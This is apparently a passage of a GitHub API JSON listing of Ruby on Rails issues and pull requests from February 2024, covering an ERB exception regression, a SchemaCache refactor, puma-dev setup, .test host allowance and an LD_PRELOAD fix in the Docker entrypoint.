            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 1,
        "created_at": "2024-02-14T22:25:00Z",
        "updated_at": "2024-02-14T22:34:35Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Another ERB regression. Here's the template:\r\n\r\n```\r\n<p style=\"color: green\"><%= notice %></p>\r\n\r\n<% content_for :title, \"Posts\" %>\r\n\r\n<h1>Posts</h1>\r\n\r\n<div id=\"posts\">\r\n  <%# @posts.each do |post| %>\r\n    <%#= render post %>\r\n    <p>\r\n      <%= link_to \"Show this post\", post %>\r\n    </p>\r\n  <% end %>\r\n</div>\r\n\r\n<%= link_to \"New post\", new_post_path %>\r\n```\r\n\r\nHere's the exception screen:\r\n\r\n![CleanShot 2024-02-14 at 14 19 08@2x](https://github.com/rails/rails/assets/2741/84d72fe0-32e6-4597-9424-756af8f56480)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51092/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51092/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51091",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51091/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51091/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51091/events",
        "html_url": "https://github.com/rails/rails/pull/51091",
        "id": 2134911032,
        "node_id": "PR_kwDNIULOZuPdRw",
        "number": 51091,
        "title": "Refactor SchemaCache to hold a ConnectionPool",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-14T18:18:09Z",
        "updated_at": "2024-02-15T13:09:57Z",
        "closed_at": "2024-02-15T13:09:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51091",
            "html_url": "https://github.com/rails/rails/pull/51091",
            "diff_url": "https://github.com/rails/rails/pull/51091.diff",
            "patch_url": "https://github.com/rails/rails/pull/51091.patch",
            "merged_at": "2024-02-15T13:09:56Z"
        },
        "body": "Another refactoring in relation to https://github.com/rails/rails/pull/50793 but it makes sense even without it.\r\n\r\nAlso ref: https://github.com/rails/rails/pull/48716\r\n\r\nRather than each connection having its own `BoundSchemaReflection`, we can instead have `BoundSchemaReflection` hold a `ConnectionPool`, from which it can checkout a connection to perform queries when needed.\r\n\r\nIf the current thread already leased a connection, it will be used.\r\n\r\nThis simplifies the interface quite a bit.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51091/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51091/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51090",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51090/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51090/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51090/events",
        "html_url": "https://github.com/rails/rails/issues/51090",
        "id": 2134743166,
        "node_id": "I_kwDNIULOfz2Yfg",
        "number": 51090,
        "title": "Exceptions raised from templates should show template code not compiled methods",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 6,
        "created_at": "2024-02-14T16:37:03Z",
        "updated_at": "2024-02-14T22:34:30Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Seems like we've regressed on exceptions raised from within ERB templates. They're showing the backtrace of the compiled method instead of the underlying template. That's not very helpful.\r\n\r\n![CleanShot 2024-02-14 at 08 36 52@2x](https://github.com/rails/rails/assets/2741/0064e1df-78c8-466c-a2a0-1f498bfb6471)\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51090/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51090/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51089",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51089/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51089/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51089/events",
        "html_url": "https://github.com/rails/rails/issues/51089",
        "id": 2134732321,
        "node_id": "I_kwDNIULOfz1uIQ",
        "number": 51089,
        "title": "Use ruby file: \".ruby-version\" when possible",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "assignees": [
            {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            }
        ],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/87",
            "html_url": "https://github.com/rails/rails/milestone/87",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/87/labels",
            "id": 10350173,
            "node_id": "MI_kwDNIULOAJ3uXQ",
            "number": 87,
            "title": "8.0.0",
            "description": null,
            "creator": {
                "login": "dhh",
                "id": 2741,
                "node_id": "MDQ6VXNlcjI3NDE=",
                "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/dhh",
                "html_url": "https://github.com/dhh",
                "followers_url": "https://api.github.com/users/dhh/followers",
                "following_url": "https://api.github.com/users/dhh/following{/other_user}",
                "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
                "organizations_url": "https://api.github.com/users/dhh/orgs",
                "repos_url": "https://api.github.com/users/dhh/repos",
                "events_url": "https://api.github.com/users/dhh/events{/privacy}",
                "received_events_url": "https://api.github.com/users/dhh/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 18,
            "closed_issues": 9,
            "state": "open",
            "created_at": "2023-12-26T22:00:17Z",
            "updated_at": "2024-02-22T20:28:18Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 5,
        "created_at": "2024-02-14T16:30:59Z",
        "updated_at": "2024-02-15T17:32:46Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "Bundler has a nice new feature to get the ruby version from .ruby-version. Would be nice to take advantage of that when possible. So the default Gemfile should generate `ruby file: \".ruby-version\"` when we can.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51089/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51089/timeline",
        "performed_via_github_app": null,
        "state_reason": "reopened"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51088",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51088/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51088/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51088/events",
        "html_url": "https://github.com/rails/rails/pull/51088",
        "id": 2134700430,
        "node_id": "PR_kwDNIULOZuD8Og",
        "number": 51088,
        "title": "Suggest puma-dev configuration in bin/setup",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T16:13:23Z",
        "updated_at": "2024-02-14T16:26:20Z",
        "closed_at": "2024-02-14T16:26:19Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51088",
            "html_url": "https://github.com/rails/rails/pull/51088",
            "diff_url": "https://github.com/rails/rails/pull/51088.diff",
            "patch_url": "https://github.com/rails/rails/pull/51088.patch",
            "merged_at": "2024-02-14T16:26:19Z"
        },
        "body": "puma-dev is the golden path for developing multiple Rails applications locally, if you're not using Docker. Let's suggest how to get that setup for apps with bin/setup.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51088/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51088/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51087",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51087/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51087/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51087/events",
        "html_url": "https://github.com/rails/rails/pull/51087",
        "id": 2134690772,
        "node_id": "PR_kwDNIULOZuDapw",
        "number": 51087,
        "title": "Allow .test by default in development",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-14T16:08:07Z",
        "updated_at": "2024-02-14T17:42:31Z",
        "closed_at": "2024-02-14T16:28:25Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51087",
            "html_url": "https://github.com/rails/rails/pull/51087",
            "diff_url": "https://github.com/rails/rails/pull/51087.diff",
            "patch_url": "https://github.com/rails/rails/pull/51087.patch",
            "merged_at": "2024-02-14T16:28:25Z"
        },
        "body": "Fixes https://github.com/rails/rails/issues/51086",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51087/reactions",
            "total_count": 6,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 6,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51087/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51086",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51086/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51086/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51086/events",
        "html_url": "https://github.com/rails/rails/issues/51086",
        "id": 2134685589,
        "node_id": "I_kwDNIULOfzy3lQ",
        "number": 51086,
        "title": "Add .test to default allowed host in development mode",
        "user": {
            "login": "dhh",
            "id": 2741,
            "node_id": "MDQ6VXNlcjI3NDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2741?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dhh",
            "html_url": "https://github.com/dhh",
            "followers_url": "https://api.github.com/users/dhh/followers",
            "following_url": "https://api.github.com/users/dhh/following{/other_user}",
            "gists_url": "https://api.github.com/users/dhh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dhh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dhh/subscriptions",
            "organizations_url": "https://api.github.com/users/dhh/orgs",
            "repos_url": "https://api.github.com/users/dhh/repos",
            "events_url": "https://api.github.com/users/dhh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dhh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T16:05:21Z",
        "updated_at": "2024-02-14T16:28:26Z",
        "closed_at": "2024-02-14T16:28:26Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "By default, puma-dev uses the .test TLD to route development requests, and we should ensure that this works out of the box. Right now you'll get this error message:\r\n\r\n![CleanShot 2024-02-14 at 08 04 48@2x](https://github.com/rails/rails/assets/2741/1a7758ae-dfac-4af0-9f6b-e5beed025f6d)\r\n\r\nThat's pretty unfriendly for a golden path like puma-dev. So let's add \\.test$ as a default allowed TLD.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51086/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51086/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51085",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51085/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51085/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51085/events",
        "html_url": "https://github.com/rails/rails/pull/51085",
        "id": 2134684732,
        "node_id": "PR_kwDNIULOZuDFxg",
        "number": 51085,
        "title": "Add missing super in prune_thread_cache method",
        "user": {
            "login": "eugeneius",
            "id": 432189,
            "node_id": "MDQ6VXNlcjQzMjE4OQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/432189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/eugeneius",
            "html_url": "https://github.com/eugeneius",
            "followers_url": "https://api.github.com/users/eugeneius/followers",
            "following_url": "https://api.github.com/users/eugeneius/following{/other_user}",
            "gists_url": "https://api.github.com/users/eugeneius/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/eugeneius/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/eugeneius/subscriptions",
            "organizations_url": "https://api.github.com/users/eugeneius/orgs",
            "repos_url": "https://api.github.com/users/eugeneius/repos",
            "events_url": "https://api.github.com/users/eugeneius/events{/privacy}",
            "received_events_url": "https://api.github.com/users/eugeneius/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-14T16:04:54Z",
        "updated_at": "2024-02-14T17:14:04Z",
        "closed_at": "2024-02-14T17:14:03Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51085",
            "html_url": "https://github.com/rails/rails/pull/51085",
            "diff_url": "https://github.com/rails/rails/pull/51085.diff",
            "patch_url": "https://github.com/rails/rails/pull/51085.patch",
            "merged_at": "2024-02-14T17:14:03Z"
        },
        "body": "Followup to https://github.com/rails/rails/pull/50938.\r\n\r\n~QueryCache::ConnectionPoolConfiguration is prepended to ConnectionPool and its `prune_thread_cache` method doesn't call super, so this method was never called. It's also unnecessary: reaped connections are already removed from `@thread_cached_conns` by the `remove_connection_from_thread_cache` call in `steal!`.~",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51085/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51085/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51084",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51084/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51084/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51084/events",
        "html_url": "https://github.com/rails/rails/pull/51084",
        "id": 2134352840,
        "node_id": "PR_kwDNIULOZtwz9A",
        "number": 51084,
        "title": "Dont override LD_PRELOAD value",
        "user": {
            "login": "anonychun",
            "id": 41361100,
            "node_id": "MDQ6VXNlcjQxMzYxMTAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/41361100?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/anonychun",
            "html_url": "https://github.com/anonychun",
            "followers_url": "https://api.github.com/users/anonychun/followers",
            "following_url": "https://api.github.com/users/anonychun/following{/other_user}",
            "gists_url": "https://api.github.com/users/anonychun/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/anonychun/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/anonychun/subscriptions",
            "organizations_url": "https://api.github.com/users/anonychun/orgs",
            "repos_url": "https://api.github.com/users/anonychun/repos",
            "events_url": "https://api.github.com/users/anonychun/events{/privacy}",
            "received_events_url": "https://api.github.com/users/anonychun/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-14T13:26:59Z",
        "updated_at": "2024-02-14T17:58:56Z",
        "closed_at": "2024-02-14T17:58:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51084",
            "html_url": "https://github.com/rails/rails/pull/51084",
            "diff_url": "https://github.com/rails/rails/pull/51084.diff",
            "patch_url": "https://github.com/rails/rails/pull/51084.patch",
            "merged_at": "2024-02-14T17:58:56Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nPrevents conflicts by only setting LD_PRELOAD if it's not already defined, the script avoids potential issues with overriding existing values and ensures compatibility with other tools or libraries that might rely on specific LD_PRELOAD settings.\r\n\r\n### Detail\r\n\r\nThis pull request proposes a change to the Docker entrypoint script in the Rails codebase to prevent potential issues with overriding the LD_PRELOAD environment variable if it's already set.\r\n\r\nThe current script includes a line that sets LD_PRELOAD to include the path to libjemalloc.so.2 if the library exists. However, this approach doesn't consider the possibility that LD_PRELOAD might already be defined with other values for different purposes. In such cases, blindly appending libjemalloc.so.2 could lead to unexpected behavior or conflicts.\r\n\r\nTo address this concern, the pull request introduces a modification that checks if LD_PRELOAD is already set before adding libjemalloc.so.2. This ensures that the existing value remains intact while still allowing the inclusion of jemalloc if it's not already present.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or 